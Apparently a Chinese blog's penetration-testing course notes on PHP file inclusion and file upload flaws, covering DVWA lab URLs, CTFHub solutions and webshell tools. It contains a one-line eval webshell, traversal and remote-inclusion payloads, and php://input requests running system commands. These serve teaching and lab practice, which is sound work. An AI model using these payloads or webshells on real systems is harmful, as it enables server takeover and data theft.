        <content type="html"><![CDATA[<h1 id="课程大纲"><a href="#课程大纲" class="headerlink" title="课程大纲"></a>课程大纲</h1><ol><li>什么是文件包含漏洞 </li><li>PHP相关函数和伪协议 </li><li>DVWA靶场案例演示 </li><li>CTF题目案例 </li><li>文件包含漏洞挖掘与利用 </li><li>文件包含漏洞修复方案</li></ol><h1 id="什么是文件包含漏洞"><a href="#什么是文件包含漏洞" class="headerlink" title="什么是文件包含漏洞"></a>什么是文件包含漏洞</h1><h2 id="为什么要包含文件"><a href="#为什么要包含文件" class="headerlink" title="为什么要包含文件"></a>为什么要包含文件</h2><p>内容包含，函数包含，减少重复的操作。</p><h2 id="文件包含漏洞类型"><a href="#文件包含漏洞类型" class="headerlink" title="文件包含漏洞类型"></a>文件包含漏洞类型</h2><p><strong>本地文件包含</strong> Local File Inclusion ：LFI </p><p><strong>远程文件包含</strong> Remote File Inclusion ：RFI </p><p>目录遍历漏洞/任意文件访问漏洞</p><h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><p><code>footer.php</code> </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p&gt;copyright © 2021-"</span> <span class="token operator">.</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Y"</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" wuya &lt;/p&gt;"</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>main.php</code></p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;h1&gt;这是你第1234次访问本网站&lt;/h1&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;欢迎下次再来&lt;/p&gt;&lt;?php include 'footer.php';?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="动态包含"><a href="#动态包含" class="headerlink" title="动态包含"></a>动态包含</h4><p><a href="http://192.168.31.193:8090/include.php?file=footer.php">http://192.168.31.193:8090/include.php?file=footer.php</a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$file</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"file fail"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="包含恶意代码或图片马"><a href="#包含恶意代码或图片马" class="headerlink" title="包含恶意代码或图片马"></a>包含恶意代码或图片马</h4><p><a href="http://192.168.31.193:8090/include.php?file=shell.php">http://192.168.31.193:8090/include.php?file=shell.php</a> </p><p><a href="http://192.168.31.193:7298/include.php?file=upload/1.gif">http://192.168.31.193:7298/include.php?file=upload/1.gif</a></p><h4 id="包含敏感文件"><a href="#包含敏感文件" class="headerlink" title="包含敏感文件"></a>包含敏感文件</h4><p><a href="http://192.168.31.193:8090/include.php?file=C:/Windows/system.ini">http://192.168.31.193:8090/include.php?file=C:/Windows/system.ini</a></p><h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><table><thead><tr><th>漏洞</th><th>描述</th><th>原因</th><th>后果</th></tr></thead><tbody><tr><td>XXE</td><td>XML外部实体注入</td><td>使用XML传输数据， 并且允许解析外部实体</td><td>导致访问敏感文件、探测端口、执行系统命令等等</td></tr><tr><td>SSRF</td><td>服务端请求伪造</td><td>因为使 用 curl_exec()之类的函数</td><td>导致端口扫描、攻击内网主机、绕过防火墙、获取敏感 信息、访问大文件造成内存溢出、操作Redis等等问题</td></tr><tr><td>RFI</td><td>远 程 文 件 包 含</td><td>使用了include</td><td>导致任意文件访问、包含shell代码</td></tr></tbody></table><h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p><code>php.ini</code> </p><pre class="line-numbers language-none"><code class="language-none">allow_url_fopen=On allow_url_include=On<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="远程服务器文件"><a href="#远程服务器文件" class="headerlink" title="远程服务器文件"></a>远程服务器文件</h4><p><a href="http://192.168.31.193:8090/include.php?file=http://192.168.31.193:8090/shell.php">http://192.168.31.193:8090/include.php?file=http://192.168.31.193:8090/shell.php</a></p><h3 id="CVE典型案例"><a href="#CVE典型案例" class="headerlink" title="CVE典型案例"></a>CVE典型案例</h3><p><strong>CVE-2018-12613</strong> ：PHPMyAdmin后台任意文件包含漏洞</p><p><strong>CVE-2020-1938</strong> ：Apache Tomcat 文件包含漏洞 </p><p><a href="http://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=file+inclusio">http://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=file+inclusio</a></p><h1 id="PHP相关函数和伪协议"><a href="#PHP相关函数和伪协议" class="headerlink" title="PHP相关函数和伪协议"></a>PHP相关函数和伪协议</h1><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><table><thead><tr><th>函数</th><th>作用</th></tr></thead><tbody><tr><td>include()</td><td>include 语句包含并运行指定文件</td></tr><tr><td>include_once()</td><td>只包含一次，不重复包含</td></tr><tr><td>require()</td><td>和include一样，不过出错时会停止</td></tr><tr><td>require_once()</td><td>和include_once一样</td></tr><tr><td>fopen()</td><td>打开文件或者 URL</td></tr><tr><td>readfile</td><td>读取文件并写入到输出缓冲。</td></tr><tr><td>highlight_file</td><td>语法高亮一个文件</td></tr><tr><td>show_source</td><td>等于highlight_file()</td></tr><tr><td>file_get_contents</td><td>将整个文件读入一个字符串</td></tr><tr><td>file</td><td>把整个文件读入一个数组中</td></tr></tbody></table><h2 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h2><p>parse_str(file_get_contents(‘php://input’), $_PUT);</p><ul><li>file:// — 访问本地文件系统</li><li>http:// — 访问 HTTP(s) 网址</li><li>ftp:// — 访问 FTP(s) URLs</li><li>php:// — 访问各个输入/输出流（I/O streams）</li><li>zlib:// — 压缩流</li><li>data:// — 数据（RFC 2397）</li><li>glob:// — 查找匹配的文件路径模式</li><li>phar:// — PHP 归档</li><li>ssh2:// — Secure Shell 2</li><li>rar:// — RAR</li><li>ogg:// — 音频流</li><li>expect:// — 处理交互式的流</li></ul><p><a href="https://www.php.net/manual/zh/wrappers.php">https://www.php.net/manual/zh/wrappers.php</a> </p><h1 id="DVWA靶场"><a href="#DVWA靶场" class="headerlink" title="DVWA靶场"></a>DVWA靶场</h1><h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><p><code>../</code>目录穿越</p><p><a href="http://192.168.31.193:8084/vulnerabilities/fi/?page=../../php.ini">http://192.168.31.193:8084/vulnerabilities/fi/?page=../../php.ini</a></p><p>远程文件包含</p><p><a href="http://192.168.31.193:8084/vulnerabilities/fi/?page=http://192.168.31.193:8090/include.php?file=shell.php">http://192.168.31.193:8084/vulnerabilities/fi/?page=http://192.168.31.193:8090/include.php?file=shell.php</a></p><h2 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h2><p>双写绕过：</p><p><a href="http://192.168.31.193:8084/vulnerabilities/fi/?page=ht%60http://%60tp://192.168.31.193:8090/shell.php">http://192.168.31.193:8084/vulnerabilities/fi/?page=ht`http://`tp://192.168.31.193:8090/shell.php</a></p><p><a href="http://192.168.31.193:8084/vulnerabilities/fi/?page=.%60../%60./.%60../%60./php.ini">http://192.168.31.193:8084/vulnerabilities/fi/?page=.`../`./.`../`./php.ini</a></p><p>绝对路径： </p><p><a href="http://192.168.31.193:8084/vulnerabilities/fi/?page=E:/phpstudy_pro/WWW/dvwa.com/php.ini">http://192.168.31.193:8084/vulnerabilities/fi/?page=E:/phpstudy_pro/WWW/dvwa.com/php.ini</a></p><h2 id="high"><a href="#high" class="headerlink" title="high"></a>high</h2><p>伪协议：</p><p><a href="http://192.168.31.193:8084/vulnerabilities/fi/?page=%60file:///%60C:/Windows/system.ini">http://192.168.31.193:8084/vulnerabilities/fi/?page=`file:///`C:/Windows/system.ini</a></p><h1 id="CTF题目案例"><a href="#CTF题目案例" class="headerlink" title="CTF题目案例"></a>CTF题目案例</h1><p><a href="https://www.ctfhub.com/">https://www.ctfhub.com/</a></p><p><img src="/assets/image-20221124112022198.png" alt="image-20221124112022198"></p><p><img src="/assets/image-20221124112029801.png" alt="image-20221124112029801"></p><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>包含shell.txt</p><p><a href="http://challenge-80af2fa93455888e.sandbox.ctfhub.com:10800/?file=shell.txt">http://challenge-80af2fa93455888e.sandbox.ctfhub.com:10800/?file=shell.txt</a></p><pre class="line-numbers language-none"><code class="language-none">&lt;?php @eval($_POST['ctfhub']);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发起post请求</p><p><code>ctfhub=system('ls');</code> </p><p><code>ctfhub=system('find / -name flag*');</code></p><p><code>ctfhub=system('cat /flag')</code></p><p>得到flag:</p><p>ctfhub{1ddd090b9002c54d69cf87a0}</p><h3 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php://input"></a>php://input</h3><p>伪协议，读取文件流</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"php://"</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hacker!!!"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">&gt;</span></span>i don't have shell, how to get flag? <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>phpinfo.php<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>phpinfo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问<a href="http://challenge-39f23084ae74e66d.sandbox.ctfhub.com:10800/?file=phpinfo.php">http://challenge-39f23084ae74e66d.sandbox.ctfhub.com:10800/?file=phpinfo.php</a></p><p><img src="/assets/image-20221124114612027.png" alt="image-20221124114612027"></p><p>文件包含开启了。</p><p>抓包</p><pre class="line-numbers language-none"><code class="language-none">GET /?file=php://input HTTP/1.1Host: challenge-39f23084ae74e66d.sandbox.ctfhub.com:10800Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>改成post包，发送请求</p><pre class="line-numbers language-none"><code class="language-none">POST /?file=php://input HTTP/1.1Host: challenge-39f23084ae74e66d.sandbox.ctfhub.com:10800Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeContent-Length: 26&lt;?php system('ls /'); ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/assets/image-20221124115348824.png" alt="image-20221124115348824"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat /flag_25234'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ctfhub{9c76898e6c38a9151c167a32}</p><h3 id="远程文件包含-1"><a href="#远程文件包含-1" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p><code>?file=php://input</code></p><p><a href="http://challenge-62e25535b4e2cd95.sandbox.ctfhub.com:10800/?file=php://input">http://challenge-62e25535b4e2cd95.sandbox.ctfhub.com:10800/?file=php://input</a></p><p>抓包</p><pre class="line-numbers language-none"><code class="language-none">GET /?file=php://input HTTP/1.1Host: challenge-62e25535b4e2cd95.sandbox.ctfhub.com:10800Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同样改成post包</p><p><code>&lt;?php system('ls /'); ?&gt;</code></p><pre class="line-numbers language-none"><code class="language-none">POST /?file=php://input HTTP/1.1Host: challenge-62e25535b4e2cd95.sandbox.ctfhub.com:10800Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close&lt;?php system('ls /'); ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/assets/image-20221124131721695.png" alt="image-20221124131721695"></p><p><code>&lt;?php system('cat /flag'); ?&gt;</code></p><p>ctfhub{027551702824f698029993a4}</p><h1 id="文件包含漏洞挖掘与利用"><a href="#文件包含漏洞挖掘与利用" class="headerlink" title="文件包含漏洞挖掘与利用"></a>文件包含漏洞挖掘与利用</h1><h2 id="URL关键字"><a href="#URL关键字" class="headerlink" title="URL关键字"></a>URL关键字</h2><p>参数名字出现了page、file、filename、include等等关键字。 </p><p>URL参数值出现了文件名，比如xxx.php xxx.html 等等。 </p><p>比如： </p><p><code>?file=content</code> </p><p><code>?page=wuya.asp</code> </p><p><code>?home=wuya.html</code></p><h2 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h2><ol><li>发现漏洞 </li><li>上传shell / 读取敏感文件（FUZZ） </li><li>执行恶意代码</li></ol><h2 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h2><h3 id="LFISuite"><a href="#LFISuite" class="headerlink" title="LFISuite"></a>LFISuite</h3><p><a href="https://github.com/D35m0nd142/LFISuite">https://github.com/D35m0nd142/LFISuite</a></p><p>没有判断是否有文件包含的功能，只是利用文件包含的工具，帮助获取命令执行的权限。</p><h3 id="wfuzz"><a href="#wfuzz" class="headerlink" title="wfuzz"></a>wfuzz</h3><pre class="line-numbers language-none"><code class="language-none">wfuzz -w /usr/share/wordlists/wfuzz/general/common.txt http://192.168.31.193:8090/include.php?file=FUZZ<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用wfuzz跑网页的目录。</p><p>过滤重复的数据。</p><pre class="line-numbers language-none"><code class="language-none">wfuzz --hw 35 -w /usr/share/wordlists/wfuzz/general/common.txt http://192.168.31.193:8090/include.php?file=FUZZ<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用多个<code>../</code></p><p> <a href="http://linsutruxcitupre/dinQucelryuLdanegu.apgehp?file=../../../../../etc/passwd">http://LinSutruxcItuPre/dinQucelryuLdanegu.apgehp?file=../../../../../etc/passwd</a></p><h1 id="文件包含漏洞修复方案"><a href="#文件包含漏洞修复方案" class="headerlink" title="文件包含漏洞修复方案"></a>文件包含漏洞修复方案</h1><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><ol><li>PHP配置 </li><li>用动态包含 </li><li>过滤协议、目录字符 </li><li>设置文件白名单</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/13-wen-jian-shang-chuan/wen-jian-shang-chuan/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/13-wen-jian-shang-chuan/wen-jian-shang-chuan/</url>
      
        <content type="html"><![CDATA[<h1 id="课程大纲"><a href="#课程大纲" class="headerlink" title="课程大纲"></a>课程大纲</h1><ol><li>文件上传漏洞原理 </li><li>Webshell介绍 </li><li>网站控制工具 </li><li>文件上传漏洞危害 </li><li>文件上传漏洞靶场安装 </li><li>文件上传漏洞靶场练习 </li><li>文件上传漏洞发现与利用 </li><li>文件上传漏洞防御</li></ol><h1 id="文件上传漏洞原理"><a href="#文件上传漏洞原理" class="headerlink" title="文件上传漏洞原理"></a>文件上传漏洞原理</h1><h2 id="文件上传场景"><a href="#文件上传场景" class="headerlink" title="文件上传场景"></a>文件上传场景</h2><ul><li>上传头像 </li><li>上传代码 </li><li>上传图片 </li><li>上传简历 </li><li>上传附件</li></ul><h2 id="PHP代码文件上传"><a href="#PHP代码文件上传" class="headerlink" title="PHP代码文件上传"></a>PHP代码文件上传</h2><p><code>multipart/form-data</code> </p><p><code>move_uploaded_file</code></p><h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'wuya'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><em>@：屏蔽警告，可有可无。</em></p><p><em>eval：把字符串作为PHP代码执行</em></p><p><em>$_POST：获得POST请求的参数值</em></p><h3 id="system-执行系统命令"><a href="#system-执行系统命令" class="headerlink" title="system 执行系统命令"></a>system 执行系统命令</h3><p><code>wuya=system(ipconfig);</code> </p><p><code>wuya=system(dir);</code></p><h1 id="Webshell介绍"><a href="#Webshell介绍" class="headerlink" title="Webshell介绍"></a>Webshell介绍</h1><h3 id="一句话木马-1"><a href="#一句话木马-1" class="headerlink" title="一句话木马"></a>一句话木马</h3><p>代码短，只有一行代码。 </p><p>场景多，可以单独生成文件，也可以插入到图 片中。 </p><p>安全性高，隐匿性强，可变形免杀</p><h3 id="小马"><a href="#小马" class="headerlink" title="小马"></a>小马</h3><p>体积小，功能少 </p><p>只有文件上传功能</p><h3 id="大马"><a href="#大马" class="headerlink" title="大马"></a>大马</h3><p>体积大，功能全 </p><p>能够管理数据库、文件管理、对站点进行快速的信息收集，甚至能够提权</p><h2 id="Webshell集合"><a href="#Webshell集合" class="headerlink" title="Webshell集合"></a>Webshell集合</h2><p><a href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a></p><h1 id="网站控制工具"><a href="#网站控制工具" class="headerlink" title="网站控制工具"></a>网站控制工具</h1><h2 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h2><p>现在用不了了。</p><h2 id="中国蚁剑"><a href="#中国蚁剑" class="headerlink" title="中国蚁剑"></a>中国蚁剑</h2><p>主程序：<a href="https://github.com/AntSwordProject/antSword/releases">https://github.com/AntSwordProject/antSword/releases</a></p><p>加载器：<a href="https://github.com/AntSwordProject/AntSword-Loader/releases">https://github.com/AntSwordProject/AntSword-Loader/releases</a></p><h2 id="weevely"><a href="#weevely" class="headerlink" title="weevely"></a>weevely</h2><p><a href="https://github.com/epinna/weevely3">https://github.com/epinna/weevely3</a> </p><p>kali自带的。</p><pre class="line-numbers language-apl" data-language="apl"><code class="language-apl">┌──<span class="token punctuation">(</span>root㉿guoyx<span class="token punctuation">)</span><span class="token function">-</span><span class="token punctuation">[</span><span class="token monadic-operator operator">/</span>home<span class="token monadic-operator operator">/</span>kali<span class="token punctuation">]</span>└─<span class="token comment"># weevely   </span><span class="token punctuation">[</span><span class="token function">+</span><span class="token punctuation">]</span> weevely <span class="token number">4.0</span><span class="token number">.1</span><span class="token punctuation">[</span><span class="token function">!</span><span class="token punctuation">]</span> Error<span class="token dfn builtin">:</span> the following arguments are required<span class="token dfn builtin">:</span> url<span class="token function">,</span> password<span class="token punctuation">[</span><span class="token function">+</span><span class="token punctuation">]</span> Run terminal or command on the target    weevely <span class="token function">&lt;</span>URL<span class="token function">&gt;</span> <span class="token function">&lt;</span>password<span class="token function">&gt;</span> <span class="token punctuation">[</span>cmd<span class="token punctuation">]</span>    <span class="token punctuation">[</span><span class="token function">+</span><span class="token punctuation">]</span> Recover an existing session    weevely session <span class="token function">&lt;</span>path<span class="token function">&gt;</span> <span class="token punctuation">[</span>cmd<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token function">+</span><span class="token punctuation">]</span> Generate new agent    weevely generate <span class="token function">&lt;</span>password<span class="token function">&gt;</span> <span class="token function">&lt;</span>path<span class="token function">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="weevely-地址-密码-命令"><a href="#weevely-地址-密码-命令" class="headerlink" title="weevely 地址 密码 命令"></a>weevely 地址 密码 命令</h3><p>连接已经上传的一句话木马，在目标上运行终端和命令</p><p><code>weevely http://192.168.31.193:8088/uploads/shell.php wuya </code></p><h3 id="weevely-session-密码-命令"><a href="#weevely-session-密码-命令" class="headerlink" title="weevely session 密码 命令"></a>weevely session 密码 命令</h3><p>可以恢复现有会话，在连接但是没有使用的会话</p><h3 id="weevely-generate-密码-文件"><a href="#weevely-generate-密码-文件" class="headerlink" title="weevely generate  密码 文件"></a>weevely generate  密码 文件</h3><p>生成一个一句话木马</p><p><code>weevely generate wuya weevely.php</code></p><h2 id="哥斯拉-godzilla"><a href="#哥斯拉-godzilla" class="headerlink" title="哥斯拉 godzilla"></a>哥斯拉 godzilla</h2><p><a href="https://github.com/BeichenDream/Godzilla/releases">https://github.com/BeichenDream/Godzilla/releases</a> </p><h2 id="冰蝎-behinder"><a href="#冰蝎-behinder" class="headerlink" title="冰蝎 behinder"></a>冰蝎 behinder</h2><p><a href="https://github.com/rebeyond/Behinder/releases">https://github.com/rebeyond/Behinder/releases</a></p><h1 id="文件上传漏洞危害"><a href="#文件上传漏洞危害" class="headerlink" title="文件上传漏洞危害"></a>文件上传漏洞危害</h1><h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><p>文件上传漏洞是指用户上传了一个<strong>可执行的脚本文件</strong>，</p><p>而且通过这个脚本文件获得了执行服务器端命令的能力。</p><h2 id="危害：黑链"><a href="#危害：黑链" class="headerlink" title="危害：黑链"></a>危害：黑链</h2><p><img src="/assets/image-20221121210017240.png" alt="image-20221121210017240"></p><h2 id="危害：挖矿"><a href="#危害：挖矿" class="headerlink" title="危害：挖矿"></a>危害：挖矿</h2><p><img src="/assets/image-20221121210034655.png" alt="image-20221121210034655"></p><h2 id="危害：文件泄露"><a href="#危害：文件泄露" class="headerlink" title="危害：文件泄露"></a>危害：文件泄露</h2><p><img src="/assets/image-20221121210110124.png" alt="image-20221121210110124"></p><h1 id="文件上传漏洞靶场安装"><a href="#文件上传漏洞靶场安装" class="headerlink" title="文件上传漏洞靶场安装"></a>文件上传漏洞靶场安装</h1><p><a href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></p><h1 id="文件上传漏洞-1"><a href="#文件上传漏洞-1" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><h2 id="MIME"><a href="#MIME" class="headerlink" title="MIME"></a>MIME</h2><p>Multipurpose Internet Mail Extensions </p><p>多用途互联网邮件扩展类型 </p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types/Common_types">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types/Common_types</a></p><h3 id="常见类型"><a href="#常见类型" class="headerlink" title="常见类型"></a>常见类型</h3><table><thead><tr><th>MIME</th><th>描述</th></tr></thead><tbody><tr><td>text/htm</td><td>HTML格式</td></tr><tr><td>application/json</td><td>JSON数据格式</td></tr><tr><td>multipart/form-data</td><td>文件上传（二进制数据）</td></tr><tr><td>image/jpeg</td><td>jpg图片格</td></tr></tbody></table><h3 id="MIME用法"><a href="#MIME用法" class="headerlink" title="MIME用法"></a>MIME用法</h3><h4 id="客户端使用："><a href="#客户端使用：" class="headerlink" title="客户端使用："></a>客户端使用：</h4><p>1、GET请求不需要这个字段。 </p><p>2、POST<strong>请求头</strong>，放在<strong>Content Type</strong>字段用来指定上传的文件类型，方便服务器解析。放在<strong>Accept</strong>，告诉服务端允许接收的响应类型。比如只能接收json或者其他。</p><h4 id="服务端使用："><a href="#服务端使用：" class="headerlink" title="服务端使用："></a>服务端使用：</h4><p>1、放在<strong>响应头</strong>里面，<strong>Content Type</strong>告诉客户端响应的数据类型，方便客户端解析。</p><h2 id="等价扩展名"><a href="#等价扩展名" class="headerlink" title="等价扩展名"></a>等价扩展名</h2><table><thead><tr><th>语言</th><th>等价扩展名</th></tr></thead><tbody><tr><td>asp</td><td>asa,cer,cdx</td></tr><tr><td>aspx</td><td>ashx,asmx,ascx</td></tr><tr><td>php</td><td>php2、php3、php4、php5、phps、phtml</td></tr><tr><td>jsp</td><td>jspx,jspf</td></tr></tbody></table><h2 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h2><p>Hypertext Access(超文本入口)</p><p>.htaccess 文件是 Apache 服务器中的一个配置文件，它负 责相关目录下的网页配置。 </p><p>通过 .htaccess 文件，可以实现：</p><ul><li>网页 301 重定向、</li><li>自定义 404 错误页面、</li><li>改变文件扩展名、</li><li>允许/阻止特定的用户或者 目录的访问、</li><li>禁止目录列表、</li><li>配置默认文档等功能</li></ul><h2 id="文件名截断"><a href="#文件名截断" class="headerlink" title="文件名截断"></a>文件名截断</h2><p>截断字符：chr(0) ，类似于C++的”\0” </p><p>filename=test.php**%00**.txt —— filename=test.php</p><table><thead><tr><th>URL encode</th><th>ASCII value</th></tr></thead><tbody><tr><td>%00</td><td>0</td></tr></tbody></table><h2 id="Content-Disposition"><a href="#Content-Disposition" class="headerlink" title="Content-Disposition"></a>Content-Disposition</h2><p>作为对下载文件的一个标识字段 </p><p><a 